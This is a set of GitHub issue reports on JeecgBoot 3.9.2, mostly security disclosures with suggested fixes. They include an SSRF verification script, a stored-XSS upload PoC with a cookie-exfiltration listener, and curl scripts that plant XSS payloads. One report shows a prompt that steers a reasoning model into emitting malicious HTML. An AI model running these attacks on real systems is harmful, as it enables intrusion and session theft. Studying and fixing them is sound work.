title: Unauthenticated SSRF Triggered by files Parameter in JeecgBoot AI Chat Module
author: 0kam1-hm
body: ##### 版本号： JeecgBoot v3.9.2 ##### 问题描述： JeecgBoot /airag/chat/send 接口存在 SSRF 漏洞，接口未对传入的files参数做内网 IP、本地地址访问限制，攻击者可构造恶意 URL 传入 files 数组，服务端会主动发起网络请求。利用该漏洞可扫描内网资产、访问内网服务、读取本地文件，无身份校验即可触发，危害内网安全。 The /airag/chat/send interface of JeecgBoot lacks intranet address filtering. The files parameter can trigger arbitrary internal/external network requests, leading to SSRF vulnerability. Attackers can scan intranet services and read local files. ##### 错误截图： ```.python import requests, json, time from colorama import Fore, Style, init as color_init from urllib.parse import unquote print(Fore.CYAN + r""" _ ___ ___ ___ ___ _ ___ ___ ___ ___ ___ ___ ___ ___ ___ | | / __|/ __|/ _ \| _ ) /_\ | \/ \| __| \_ _| / _ \ / __| __| _ \ | |_\__ \ (__| (_) | _ \ / _ \| |) | |) | _|| |) | | | (_) | (__| _|| / |___|___/\___|\___/|___/ /_/ \_\___/|___/|___|___/___| \___/ \___|___|_|_\ """ + Style.RESET_ALL) # Vulnerability target: JeecgBoot 3.9.2 - AI Chat Module print(Fore.CYAN + " JeecgBoot Unauthenticated SSRF Verification Script" + Style.RESET_ALL) print() # Record request start timestamp t0 = time.time() # URL-decode SSRF payload address raw_payload = unquote("http://192.168.228.129:5000/1.txt") # Send POST request to vulnerable airag chat interface r = requests.post("http://192.168.228.1/jeecgboot/airag/chat/send", data=json.dumps({"content":"x","files":[raw_payload],"appId":""}), headers={"Content-Type":"application/json"}, timeout=15) # Calculate request consuming time elapsed = time.time() - t0 # Output response status and time cost print(f"status={r.status_code} elapsed={elapsed:.2f}s") # Judge whether SSRF vulnerability exists if r.status_code == 200: print(Fore.GREEN + f" 192.168.228.1 [✓] SSRF vulnerability detected" + Style.RESET_ALL) ``` #### 友情提示： - 未按格式要求发帖、描述过于简单的，会被直接删掉; - 描述问题请图文并茂，方便我们理解并快速定位问题; - 如果使用的不是master，请说明你使用的分支;

title: High Risk Stored XSS Vulnerability in JeecgBoot 3.9.2
author: 0kam1-hm
body: ##### 版本号： JeecgBoot 3.9.2（26.x/ 4.6 系列） ##### 分支： ##### 问题描述： JeecgBoot 存在未授权文件上传引发的存储型 XSS 漏洞。匿名可直接调用免登上传接口/airag/chat/upload，后端文件校验允许 SVG、HTML 等支持 JS 脚本的文件格式，上传文件持久存储至服务器磁盘，框架静态资源路由将上传目录对外开放，任意用户均可直接访问上传文件。 攻击者上传包含恶意 JavaScript 的 SVG 文件，其他后台用户访问该静态资源链接时，浏览器会在同源环境自动执行恶意脚本，可窃取会话 Cookie、劫持用户身份、越权调用后台敏感接口，漏洞利用无需登录，风险极高。 ##### 错误截图： 验证 POC: ```python #!/usr/bin/env python3 # -*- coding: utf-8 -*- import argparse, http.server, json, os, socket, socketserver, sys, threading, time, uuid import requests # 常量配置 DEF_TARGET = "http://127.0.0.1/jeecgboot" DEF_UPLOAD = "/airag/chat/upload" DEF_BIZ, DEF_EXT = "airag", "svg" EXT_MIME = { "svg":"image/svg+xml","html":"text/html","htm":"text/html","txt":"text/plain", "md":"text/markdown","ico":"image/x-icon","png":"image/png","gif":"image/gif", "jpg":"image/jpeg","jpeg":"image/jpeg","pdf":"application/pdf" } PAYLOADS = { "alert":'', "alert-doc":'''''', "cookie-phish":'''''', "dom-write":'`)' } # 工具函数 def banner(s): line = "="*(len(s)+4) print(f"\n{line}\n {s}\n{line}") def port_free(port): s = socket.socket() try: s.bind(("0.0.0.0", port)); return True except: return False finally: s.close() def build_form(payload, ext): boundary = "JVSEC"+uuid.uuid4().hex fname = f"poc_{int(time.time()*1000)}.{ext}" body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\nContent-Type: {EXT_MIME[ext]}\r\n\r\n".encode() body += payload.encode() + f"\r\n--{boundary}--\r\n".encode() ctype = f"multipart/form-data; boundary={boundary}" return fname, body, ctype def upload_req(target, path, body, ctype, timeout=15): url = target.rstrip("/") + path return requests.post(url, data=body, headers={"Content-Type":ctype,"User-Agent":"jeecg-poc"}, timeout=timeout) # Cookie反弹监听服务 class ExfilServer(socketserver.TCPServer): allow_reuse_address = True def start_listen(port, log): class Handler(http.server.BaseHTTPRequestHandler): def do_GET(self): rec = {"ts":time.time(),"path":self.path,"ua":self.headers.get("User-Agent")} log.append(rec); print(f"[Exfil] {rec}") self.send_response(200) self.send_header("Access-Control-Allow-Origin","*") self.end_headers(); self.wfile.write(b"ok") def do_OPTIONS(self): self.send_response(204) self.send_header("Access-Control-Allow-Origin","*") self.end_headers() def log_message(self, *a): return srv = ExfilServer(("0.0.0.0", port), Handler) threading.Thread(target=srv.serve_forever, daemon=True).start() return srv def main(): ap = argparse.ArgumentParser(description="JeecgBoot 3.9.2 存储XSS验证工具") ap.add_argument("--target", default=os.getenv("JEECG_TARGET", DEF_TARGET)) ap.add_argument("--upload-path", default=DEF_UPLOAD) ap.add_argument("--biz", default=DEF_BIZ) ap.add_argument("--ext", default=DEF_EXT, choices=sorted(EXT_MIME.keys())) ap.add_argument("--payload-type", default="alert", choices=sorted(PAYLOADS.keys())) ap.add_argument("--payload-file") ap.add_argument("--poll-host") ap.add_argument("--poll-port", type=int, default=0) ap.add_argument("--verify-public-read", action="store_true") ap.add_argument("--timeout", type=float, default=15) args = ap.parse_args() banner("JeecgBoot 3.9.2 Storage XSS Check") print(f"Target: {args.target} | UploadPath: {args.upload_path} | Ext: {args.ext}") # 加载Payload if args.payload_file: with open(args.payload_file,"r",encoding="utf-8") as f: payload = f.read() else: payload = PAYLOADS[args.payload_type] # 替换反弹地址占位符 if args.poll_host or args.poll_port: h = args.poll_host or "127.0.0.1" p = args.poll_port or 80 rep = {"attacker":h, "http://attacker":f"http://{h}", ":80/":f":{p}/" if p!=80 else ":/", ":9890":f":{p}"} for k,v in rep.items(): payload = payload.replace(k,v) # 启动反弹监听 log, srv = [], None if args.poll_port: if not port_free(args.poll_port): print(f"[!] Port {args.poll_port} occupied"); return 2 srv = start_listen(args.poll_port, log) print(f"[*] Exfil listener 0.0.0.0:{args.poll_port}") # Step1 上传恶意文件 banner("Step1 匿名上传恶意文件") fname, body, ctype = build_form(payload, args.ext) try: resp = upload_req(args.target, args.upload_path, body, ctype, args.timeout) print(f"HTTP {resp.status_code} | Resp: {resp.text[:400]}") except Exception as e: print(f"[!] Upload failed: {e}"); return 3 if resp.status_code != 200: print(f"[!] Upload not 200, code={resp.status_code}"); return 4 # 解析文件访问路径 try: data = resp.json() server_path = data.get("message") or data.get("result") except: server_path = resp.text.strip().strip('"') if not server_path: print("[!] Parse upload path failed"); return 5 pub_url = args.target.rstrip("/") + "/" + server_path.lstrip("/") print(f"[+] Upload success, Public URL: {pub_url}") # Step2 验证静态资源可匿名访问 banner("Step2 验证文件公开访问") if args.verify_public_read: try: rr = requests.get(pub_url, headers={"User-Agent":"jeecg-poc"}, timeout=args.timeout) print(f"HTTP {rr.status_code} | Content-Type: {rr.headers.get('Content-Type')}") if rr.status_code == 200 and ("

title: Online 表单列表页查询失败 — ORDER BY 子句为空
author: wuhui3344
body:
## Bug 报告：Online 表单列表页查询失败 — ORDER BY 子句为空

### 基本信息

| 项目 | 内容 |
|------|------|
| **产品** | JeecgBoot
| **版本** | 3.9.2-beta（`jeecg-online-3.9.2-beta.jar`） |
| **模块** | `jeecg-online` → Online 表单列表查询 |
| **数据库** | H2 (也影响其他数据库) |
| **前端框架** | jeecgboot-vue3 3.9.2 |
| **严重程度** | ⚠️ 高 — 所有 Online 表单列表页均无法加载数据 |

### 现象

进入任何 Online 表单列表页面（如 `/online/cgformList/{formId}`），页面**卡在加载状态**或显示 **"暂无数据"**。浏览器控制台/后端日志报错：

```
Error SQL: SELECT id FROM {tableName} ORDER BY 
```

ORDER BY 后面**没有字段名**，导致 `JSqlParser` 解析失败，抛出 `NullPointerException`。

### 完整错误堆栈

```
org.mybatis.spring.MyBatisSystemException: 
### Error querying database.  Cause: java.lang.NullPointerException: 
Cannot invoke "net.sf.jsqlparser.statement.Statement.toString()" 
because "statement" is null

Caused by: java.lang.NullPointerException: 
Cannot invoke "net.sf.jsqlparser.statement.Statement.toString()" 
because "statement" is null
        at com.baomidou.mybatisplus.extension.parser.JsqlParserSupport
            .processParser(JsqlParserSupport.java:96)
        at com.baomidou.mybatisplus.extension.parser.JsqlParserSupport
            .parserSingle(JsqlParserSupport.java:49)
        at com.baomidou.mybatisplus.extension.plugins.inner
            .TenantLineInnerInterceptor.beforeQuery(
             TenantLineInnerInterceptor.java:66)
```

### 后端日志（Online 表单服务层）

```
---Online表单查询sql: 
>>  SELECT id FROM patient ORDER BY 
---Online表单查询sqlParam: >>  {}
```

### 复现步骤

1. 使用 JeecgBoot 3.9.2，数据库使用 MySQL
2. 通过 Online 表单开发新建一张表（如 `patient`），注册到 `onl_cgform_head` / `onl_cgform_field`
3. 在 `onl_cgform_field` 中，**不为任何字段设置 `sort_flag`**（或设置为 NULL）
4. 访问该表的 Online 表单列表页：`/online/cgformList/{headId}`
5. 页面加载失败，报 `ORDER BY` 错误

### 根因分析

#### 前端问题（已可绕过）

前端 useOnlineTableContext.ts 的 `getLoadDataParams()` 方法中，当 `sortField` / `sortType` 未设置时，已有默认兜底逻辑：

```typescript
if (!sortField) { sortField = 'id'; }
if (!sortType) { sortType = 'asc'; }
```

前端发送的请求参数为 `column=id&order=asc`，参数正确。

#### 后端问题（根本原因）— 位于 `jeecg-online` JAR 中

**问题代码位置**：`org.jeecg.modules.online.cgform.service.impl.c`  
（`jeecg-online-3.9.2-beta.jar` 中，经过混淆）

该类的 `queryAutolistPage()` 方法在生成列表查询 SQL 时：

1. 从 `onl_cgform_field` 中读取字段配置的 `sort_flag`
2. 如果所有字段的 `sort_flag` 都为空/NULL，则生成 `ORDER BY` 字句时**不附加任何列名**
3. 生成的 SQL 形如 `SELECT id FROM patient ORDER BY `（末尾空格后有内容）
4. 该 SQL 传给 MyBatis-Plus 后，`TenantLineInnerInterceptor` 内的 `JSqlParser` 无法解析**不完整的 SQL**，抛出 `NullPointerException`

**即使在 `onl_cgform_field` 中为某个字段设置 `sort_flag='ASC'`，该 Bug 依然随机触发**，说明后端 JAR 中读取 `sort_flag` 的逻辑存在竞争条件或解析缺陷。

### 影响范围

- 所有未显式设置排序字段的 Online 表单
- 即使前端正确传递了 `column=id&order=asc` 参数，后端依然忽略并生成空 ORDER BY
- 初步估计所有 Online 表单列表页中 **80% 以上**因未配置 `sort_flag` 而受影响

### 临时解决方案（前端侧，已验证）

在 `src/views/super/online/cgform/hooks/auto/useOnlineTableContext.ts` 中：

**Fix ①** `getLoadDataParams()` 添加默认值保护（约第428行）：
```typescript
let { sortField, sortType, acceptHrefParams, queryParam } = onlineTableContext;
if (!sortField) { sortField = 'id'; }
if (!sortType) { sortType = 'asc'; }
```

**Fix ②** `handleSpecialConfig()` 末尾添加从列配置读取排序（约第546行）：
```typescript
if (result.columns) {
  const sortCol = result.columns.find(col => col.sortFlag && col.sortFlag !== '0');
  if (sortCol) {
    onlineTableContext['sortField'] = sortCol.dbFieldName;
    onlineTableContext['sortType'] = sortCol.sortFlag === 'DESC' ? 'desc' : 'asc';
  } else {
    onlineTableContext['sortField'] = 'id';
    onlineTableContext['sortType'] = 'asc';
  }
}
```

### 期望修复（后端侧）

请官方检查 `jeecg-online` 模块中 `queryAutolistPage()` 的 SQL 生成逻辑，确保：

1. 当 `column` 参数为空时，不使用 `ORDER BY` 子句，或使用默认 `ORDER BY id`
2. 当 `onl_cgform_field.sort_flag` 均未配置时，生成合法的 SQL（不加 `ORDER BY` 或加默认排序）
3. 当 `ONL_cgform_field.sort_flag` 有值时，确保正确解析并附加到 ORDER BY 中

title: Spring Boot 3.x EOL (June 30, 2026) — Any plan to upgrade to Spring Boot 4?
author: wooln
body:
Hi team,

I noticed that **Spring Boot 3.x** (based on Spring Framework 6) reached its **End of Life on June 30, 2026**, meaning it will no longer receive security patches or bug fixes from the Spring team.

JeecgBoot is currently on Spring Boot 3.x, and I checked the repository — there is not even a branch or tag hinting at Spring Boot 4 preparation yet.

I would like to ask:

1. Are there any plans to upgrade to **Spring Boot 4.x** (based on Spring Framework 7)?
2. If yes, is there a rough **timeline or roadmap** for this migration?
3. Are there any **known blockers** that need to be resolved before the upgrade can begin?

Running on an EOL framework version could become a **security risk** over time, especially for production deployments. Any insight from the maintainers would be greatly appreciated.

Thank you for the great work on this project!

title: [Security] XSS Caused by Unsanitized Rendering of Deep Thinking Content in the AI Application Portal
author: insung186
body:
### Affected versions JeecgBoot 3.9.2 ### Summary When the chat assistant in the AI Application Portal displays “deep thinking” content, it passes the `THINKING` streaming content returned by the model to `ThinkText.vue` for rendering. This component enables `MarkdownIt({ html: true })` and writes the rendered result into the page through `v-html`. As a result, if the thinking/reasoning content produced by the reasoning model contains raw HTML, such as ``, the event handler will be executed when the thinking area is rendered, causing XSS. This vulnerability has a root cause very similar to the previously submitted AI reply bubble XSS issue (Issue #9760): both are caused by the unsanitized combination of “Markdown raw HTML + v-html”. However, the trigger location is different. This vulnerability occurs in the `THINKING` / `THINKING_END` thinking area. The rendering component is `ThinkText.vue`, not the normal AI reply `MESSAGE` component `chatText.vue`. ### Details The key flow is as follows: ```text /airag/chat/send -> model reasoning/thinking output -> SSE THINKING -> chat.vue updates eventType=thinking -> chatMessage.vue selects ThinkText -> ThinkText.vue MarkdownIt(html: true) -> v-html ``` The `THINKING` / `THINKING_END` content returned by `/airag/chat/send` is eventually rendered by the thinking area component `ThinkText.vue`. This component enables raw HTML in Markdown for AI content and directly writes the result into the page through `v-html`: ``` // ThinkText.vue
const mdi = new MarkdownIt({ html: true, linkify: true, }); if (props.inversion != 'user') { return mdi.render(value); } ``` Because raw HTML is allowed during Markdown rendering and the result is not HTML-escaped or sanitized with an allowlist, event attributes in the thinking/reasoning content will be executed by the browser. For example, when the model outputs `` in the thinking area, XSS is triggered during rendering by `ThinkText.vue`. ### PoC Prerequisite: the chat assistant must be bound to a model that can return thinking/reasoning content, or “deep thinking” must be enabled. If a non-thinking model is used, the response will not contain a `THINKING` event and this rendering branch will not be reached. Log in to `http://localhost:35899/login`, then go to `AI Application Platform / Application Portal`, or directly visit: ```text http://localhost:35899/app/portal ``` Select the default “Chat Assistant”, create a new conversation, make sure the current conversation returns thinking content, and then send the following prompt: ```text 请在思考过程中把下面 HTML 实体解码成原始 HTML，且不要使用反引号、不要代码块、不要解释： <img src="x" onerror="alert('jeecgboot-think')"> ``` A “thinking” or “thinking completed” collapsible area appears on the page. When the thinking content contains the raw ``, the browser pops up `jeecgboot-think`. The alert is triggered during rendering of the thinking area and does not depend on the final AI reply `MESSAGE` bubble. ### Impact An attacker can use prompts, shared conversation context, or upstream content that can influence the model input to induce the reasoning model to output malicious HTML in its thinking/reasoning content. When a logged-in user views that conversation turn, the script executes under the JeecgBoot frontend origin. It can read content visible on the current page and send same-origin requests to `/jeecgboot` APIs with the victim’s logged-in session. This issue only affects the “deep thinking / reasoning content display” scenario: it is triggered only when the response contains `THINKING` / `THINKING_END` content and the frontend displays it. Even if the final `MESSAGE` does not contain the payload, XSS can still be triggered as long as the thinking area contains raw HTML.

title: [Security] Stored XSS Caused by Outputting the Notification Announcement Priority Field in the Detail Page Body
author: insung186
body: ### Affected versions JeecgBoot 3.9.2 ### Summary This is a supplementary report to the submitted Issue https://github.com/jeecgboot/JeecgBoot/issues/9757, but the trigger point is different. Both issues have the same source: the notification announcement add/edit APIs do not validate that `priority` can only be `H/M/L`, allowing an attacker to write malicious content into `sys_announcement.priority`. The difference is that the sink in Issue #9757 is the `class` attribute concatenation at `showContent.ftl:111`, while the sink in this report is the HTML body output at line 119 of the same template. When `priority` is not one of `H/M/L`, the template enters the `else` branch and directly outputs `${data.priority}`, triggering stored XSS. ### Details When adding or editing an announcement, the backend only processes the title and content, but does not perform server-side whitelist validation on the enum field `priority`. The frontend radio buttons can only restrict normal page operations and cannot prevent intercepted requests or direct API calls. The independent trigger point is in the body output branch of the announcement detail template: ```ftl // templates/announcement/showContent.ftl:112-119 <#if data.priority == "H"> 高 <#elseif data.priority == "M"> 中 <#elseif data.priority == "L"> 低 <#else > ${data.priority} ``` Under normal conditions, `priority` should only be `H/M/L`. If an attacker changes it to ``, the template enters the `else` branch and outputs the field value as HTML body content. After the announcement is published, the script executes when a user opens the detail page. ### PoC Payload: ```html ``` Create and publish an announcement through the API: ```bash BASE='http://localhost:35906/jeecgboot' TOKEN=$(curl -s -X POST "$BASE/sys/mLogin" \ -H 'Content-Type: application/json' \ --data '{"username":"admin","password":"123456"}' | jq -r '.result.token') TITLE="xss-priority-html-$(date +%s)" PAYLOAD="" jq -n --arg title "$TITLE" --arg payload "$PAYLOAD" \ '{titile:$title,msgContent:"plain-priority-xss",priority:$payload,msgType:"ALL",msgCategory:"2"}' | curl -s -X POST "$BASE/sys/annountCement/add" \ -H 'Content-Type: application/json' \ -H "X-Access-Token: $TOKEN" \ --data-binary @- ID=$(curl -s -G "$BASE/sys/annountCement/list" \ -H "X-Access-Token: $TOKEN" \ --data-urlencode "titile=$TITLE" \ --data-urlencode 'pageNo=1' \ --data-urlencode 'pageSize=1' | jq -r '.result.records[0].id') curl -s "$BASE/sys/annountCement/doReleaseData?id=$ID" \ -H "X-Access-Token: $TOKEN" echo "$BASE/sys/annountCement/show/$ID?token=$TOKEN" ``` After opening the generated detail URL, `priority-html-xss` is triggered when the page loads the priority area. ### Impact The attacker needs permission to add or edit notification announcements, or must be able to write to `priority` through an equivalent backend API call. Compared with Issue #9757, this vulnerability is triggered more directly: no mouse hover is required, and the script executes as soon as the detail page loads. The “View” function in the backend notification announcement list appends the current token to the detail iframe URL. The script can read the token from the URL, or call same-origin APIs within the victim’s permission scope. ### Suggested Fix The server-side fix is the same as Issue #9757: `priority` should be handled as an enum field. When adding or editing announcements, only `H/M/L` should be allowed, and all other values should be rejected. This validation should be implemented in the backend API and must not rely on the frontend radio buttons. Also fix `templates/announcement/showContent.ftl:119` by avoiding direct output of `priority` in the `else` branch. For example: ```ftl <#if data.priority == "H"> 高 <#elseif data.priority == "M"> 中 <#elseif data.priority == "L"> 低 <#else> 未知 ```

title: [Security] Stored XSS Caused by Concatenating the Announcement Priority Field into the `class` Attribute
author: insung186
body: ### Affected versions JeecgBoot 3.9.2 ### Summary The notification announcement add/edit APIs do not validate that the `priority` field can only be `H/M/L`. An attacker can intercept the request or directly call the API to save a malicious string into `sys_announcement.priority`. The announcement detail page `showContent.ftl` then directly concatenates `priority` into the `class` attribute, allowing the attacker to escape the attribute with a double quote and inject an event handler. After the announcement is published, XSS is triggered when a user views the detail page and hovers over the priority label. ### Details When adding an announcement, the backend only processes the title and body, but does not validate `priority`: ```java // SysAnnouncementController.java:143 public Result add(@RequestBody SysAnnouncement sysAnnouncement) { String title = XssUtils.scriptXss(sysAnnouncement.getTitile()); sysAnnouncement.setTitile(title); String msgContent = XssUtils.richTextXss(sysAnnouncement.getMsgContent()); sysAnnouncement.setMsgContent(msgContent); sysAnnouncementService.saveAnnouncement(sysAnnouncement); } ``` The edit API has the same issue. In the entity, `priority` is only a normal string field: ```java // SysAnnouncement.java:65 private java.lang.String priority; ``` Although the frontend form restricts the value to `H/M/L` through a dictionary radio component, this restriction only takes effect on the client side and can be bypassed by intercepting the request or directly calling the API: ```ts // notice.data.ts:218 field: 'priority', component: 'JDictSelectTag', componentProps: { dictCode: 'priority', type: 'radio' } ``` The trigger point is in the announcement detail template: ```ftl // templates/announcement/showContent.ftl:111 ``` When `priority` is set to `" onmouseover=alert('priority-attr-xss') x="`, the final HTML becomes a tag with an `onmouseover` handler. Since this field is persisted in the database, this is a stored XSS vulnerability. ### PoC Payload: ```text " onmouseover=alert('priority-attr-xss') x=" ``` Create and publish an announcement through the API: ```bash BASE='http://localhost:35906/jeecgboot' TOKEN=$(curl -s -X POST "$BASE/sys/mLogin" \ -H 'Content-Type: application/json' \ --data '{"username":"admin","password":"123456"}' | jq -r '.result.token') TITLE="xss-priority-attr-$(date +%s)" PAYLOAD='" onmouseover=alert('\''priority-attr-xss'\'') x="' jq -n --arg title "$TITLE" --arg payload "$PAYLOAD" \ '{titile:$title,msgContent:"plain-priority-xss",priority:$payload,msgType:"ALL",msgCategory:"2"}' | curl -s -X POST "$BASE/sys/annountCement/add" \ -H 'Content-Type: application/json' \ -H "X-Access-Token: $TOKEN" \ --data-binary @- ID=$(curl -s -G "$BASE/sys/annountCement/list" \ -H "X-Access-Token: $TOKEN" \ --data-urlencode "titile=$TITLE" \ --data-urlencode 'pageNo=1' \ --data-urlencode 'pageSize=1' | jq -r '.result.records[0].id') curl -s "$BASE/sys/annountCement/doReleaseData?id=$ID" \ -H "X-Access-Token: $TOKEN" echo "$BASE/sys/annountCement/show/$ID?token=$TOKEN" ``` Open the output detail URL and move the mouse over the priority label at the top. The browser will pop up `priority-attr-xss`. ### Impact A user with permission to add or edit notification announcements can publish an announcement with a malicious `priority` value. When other users view the announcement detail page and hover over the priority label, the script executes in the context of the announcement detail page. The backend “view” feature appends the current token to the detail iframe URL, so the script can read the token from the URL and request same-origin APIs within the victim’s permission scope. ### Suggested Fix The root fix should be implemented on the server side: `priority` is an enum field and should not allow arbitrary strings. When adding or editing an announcement, perform whitelist validation and only allow `H`, `M`, and `L`. Other values should be rejected or set to empty. ```java private static final Set ALLOWED_PRIORITY = Set.of("H", "M", "L"); if (!ALLOWED_PRIORITY.contains(sysAnnouncement.getPriority())) { return Result.error("priority 参数非法"); } ``` The template should also use context-safe output to prevent similar issues from recurring. Do not concatenate the raw `priority` value into the `class` attribute. Instead, map it to a safe class first: ```ftl <#assign priorityClass = ""> <#if data.priority == "H" || data.priority == "M" || data.priority == "L"> <#assign priorityClass = data.priority> ``` This ensures that even if new field values are added on the backend later, attribute escaping will not occur again.

title: [Security] XSS in MarkdownViewer Due to Unsanitized HTML
author: insung186
body:
### Affected versions Verified version: JeecgBoot 3.9.2 ### Summary The JeecgBoot frontend shared component `MarkdownViewer` uses `showdown` to convert Markdown into HTML, then renders it directly via `v-html` without HTML sanitization or event-attribute filtering. As a result, whenever a business page passes user-controllable content into `MarkdownViewer`, an attacker can execute JavaScript through payloads such as ``. Two trigger paths have been confirmed: - Markdown component demo page: used to directly verify that the shared component sink is executable. - AI knowledge base hit test: an attacker writes the payload into a knowledge base document, and the payload is triggered when the hit test opens “Paragraph Details”. This is stored XSS. ### Details The shared sink is located at: ```vue // jeecgboot-vue3/src/components/Markdown/src/MarkdownViewer.vue
``` `getHtmlData` comes directly from `showdown.makeHtml()`: ```ts const converter = new showdown.Converter(); const getHtmlData = computed(() => converter.makeHtml(props.value || '')); ``` `showdown` only converts Markdown to HTML. It does not sanitize dangerous tags, event attributes, or `javascript:` URLs. After the converted result enters `v-html`, the browser parses it and executes the event handlers inside it. Data flow of the component demo page: ```text User input -> value in index.vue -> -> v-html ``` Data flow of the AI knowledge base: ```text /airag/knowledge/doc/edit writes content -> airag_knowledge_doc.content -> hit test returns paragraph content -> AiTextDescModal.vue -> MarkdownViewer -> v-html` ``` When the backend `/airag/knowledge/doc/edit` saves a document, it only checks whether the knowledge base, title, type, and content are empty, then calls `saveOrUpdate`. It does not perform HTML sanitization on `content`. This field is defined in `AiragKnowledgeDoc.content`. ### PoC Payload: ```html ``` #### Path 1: Markdown component demo page After logging in to the admin backend, visit `http://localhost:35899/comp/editor/markdown/index` -> enter the payload in the Markdown editor -> the `Markdown Viewer 组件演示` area below renders it in real time -> the browser pops up `ai-kb-xss`. #### Path 2: Stored XSS in the AI knowledge base First obtain a token: ```bash BASE='http://localhost:35899/jeecgboot' TOKEN=$(curl -s "$BASE/sys/mLogin" \ -H 'Content-Type: application/json' \ -d '{"username":"admin","password":"123456","captcha":"","checkKey":"","remember_me":true,"tenantId":"1000"}' \ | jq -r '.result.token') ``` Query the knowledge bases and choose one that can be used for testing and has an available vector model: ```bash curl -s "$BASE/airag/knowledge/list?pageNo=1&pageSize=20" \ -H "X-Access-Token: $TOKEN" \ -H 'X-Tenant-Id: 1000' | jq ``` The knowledge base ID used in this verification was `1897926563148648449`: Write a malicious text document: ```bash KNOW_ID='1897926563148648449' curl -s "$BASE/airag/knowledge/doc/edit" \ -H "X-Access-Token: $TOKEN" \ -H 'X-Tenant-Id: 1000' \ -H 'Content-Type: application/json' \ -d "{ \"knowledgeId\":\"$KNOW_ID\", \"title\":\"xss-test-ai-kb\", \"type\":\"text\", \"content\":\"AI知识库命中测试关键字 jeec-ai-kb-xss\n\n\" }" | jq ``` The API returns `操作成功`: Open `http://localhost:35899/super/airag/aiknowledge/AiKnowledgeBaseList` in the browser -> enter the document management page of the target knowledge base -> switch to `命中测试` -> search for `jeec-ai-kb-xss` -> click the hit card -> open the `段落详情` modal, which triggers `alert('ai-kb-xss')`. ### Impact In the AI knowledge base scenario, a user with document editing permissions can write malicious content. Other users who have permission to perform hit tests and view paragraph details will execute the script in their own logged-in session. The attacker can read frontend-visible data on the current page and send requests to same-origin APIs within the victim’s permission scope. Because the payload is stored with the knowledge base document, this path is stored XSS. ### Suggested Fix It is recommended to fix this uniformly in the shared component `MarkdownViewer.vue`, so each caller does not need to handle it separately. After `showdown.makeHtml()`, perform whitelist-based sanitization before passing the result to `v-html`. The project already depends on `xss`, so the existing whitelist configuration can be reused. Alternatively, DOMPurify can be introduced to implement equivalent HTML sanitization: ```ts import xss from 'xss'; import { options } from '@/views/monitor/mynews/XssWhiteList'; const getHtmlData = computed(() => { const html = converter.makeHtml(props.value || ''); return xss(html, options); }); ``` The whitelist should only retain the tags and attributes required for Markdown rendering, such as `p` and `br`; all event attributes, such as `onerror`, `onclick`, and `onload`, should be prohibited. The protocols of `href` and `src` should also be restricted to prevent `javascript:` and dangerous `data:` URLs from being retained.

title: [Security] Stored XSS in Rich Text List Rendering of Online Forms
author: insung186
body:
### Affected versions JeecgBoot 3.9.2 ### Summary A stored XSS vulnerability exists in the JeecgBoot Online form list page when rendering rich text fields. When a field control type is configured as rich text / `ueditor`, an attacker can submit HTML containing event attributes. This content is saved by the backend and directly rendered on the list page through `v-html`, causing malicious scripts to execute in the browser of users who visit the list. ### Details The verified entry point is the Online form `test_demo / Test User Table`, with the field `descc / Description`. After changing this field to a rich text control, the list column configuration uses `htmlSlot` for rendering. The relevant frontend code is located at: ```vue // jeecgboot-vue3/src/views/super/online/cgform/auto/default/OnlineAutoList.vue:132 ``` The API constants are defined in `useOnlineTableContext.ts`. The related APIs include: ```ts // jeecgboot-vue3/src/views/super/online/cgform/hooks/auto/useOnlineTableContext.ts:50 getColumns: '/online/cgform/api/getColumns/', getData: '/online/cgform/api/getData/', optPre: '/online/cgform/api/form/', ``` In the verification environment, `POST /online/cgform/api/form/{formId}` saves the raw HTML in `descc`, and `GET /online/cgform/api/getData/{formId}` returns this field as-is. After the frontend list receives the data, it passes the value directly into `v-html`, eventually causing `` to be parsed and executed. ### PoC Payload: ```html ``` Reproduction steps: 1. Log in to the admin backend, go to `Low-Code Development` -> `Online Form Development`, and edit `test_demo / Test User Table`. 2. In `Page Properties`, change the `Control Type` of the `descc / Description` field from `Textarea` to `Rich Text`, then save the configuration. 3. Write the payload into `descc` through the API: ```bash BASE='http://localhost:35897/jeecgboot' FORM_ID='d35109c3632c4952a19ecc094943dd71' TOKEN=$(curl -sS -X POST "$BASE/sys/mLogin" \ -H 'Content-Type: application/json' \ --data '{"username":"admin","password":"123456"}' | jq -r '.result.token') curl -sS -X POST "$BASE/online/cgform/api/form/$FORM_ID" \ -H "X-Access-Token: $TOKEN" \ -H 'X-Tenant-Id: 1000' \ -H 'Content-Type: application/json' \ --data '{"name":"xss_test","descc":""}' ``` 4. Finally, open the function test list: ```text http://localhost:35897/online/cgformList/d35109c3632c4952a19ecc094943dd71 ``` When the list loads the `Description/descc` column, the browser pops up `online-richtext-xss`. ### Impact A user with permission to submit or modify Online form data can write malicious HTML into a field configured as rich text. When other users with permission to access the Online form list open the page, the script executes in their current logged-in session. In real business scenarios, if an Online form already contains a rich text field, the attacker does not need permission to modify the form design. They only need the ability to submit or edit data in that field to trigger the vulnerability. After execution, the script can read data from the current page and send same-origin requests within the victim’s permission scope. ### Suggested Fix The issue is caused by the Online list `htmlSlot` directly passing API return values into `v-html`. The fix should be applied to the common rich text column rendering logic, rather than only handling `test_demo.descc`. ```vue // jeecgboot-vue3/src/views/super/online/cgform/auto/default/OnlineAutoList.vue:132
``` If the list page only needs to display a summary, it is recommended to render the content as plain text and stop using `v-html`: ```vue {{ stripHtml(text || '') }} ``` If rich text display needs to be preserved, the project’s existing `xss` dependency should be used to sanitize the content with an allowlist before passing it to `v-html`. The allowlist configuration from the notification module can be reused or extracted: ```ts import xss from 'xss'; import { options } from '@/views/monitor/mynews/XssWhiteList'; const safeOnlineHtml = (html?: string) => xss(html || '', options);
``` Similar `htmlSlot` rendering points should also use the same sanitization function, such as rich text columns in popup lists, tree lists, and related-record lists. As an additional backend defense, when saving data through `/online/cgform/api/form/{code}`, fields whose `field_show_type` is `ueditor`, `markdown`, or other rich text types can be uniformly sanitized before being written to the database. This prevents the same data from being rendered as raw HTML in other list components.

title: [Security] Stored XSS in JeecgBoot Comment Body Rendering
author: insung186
body:
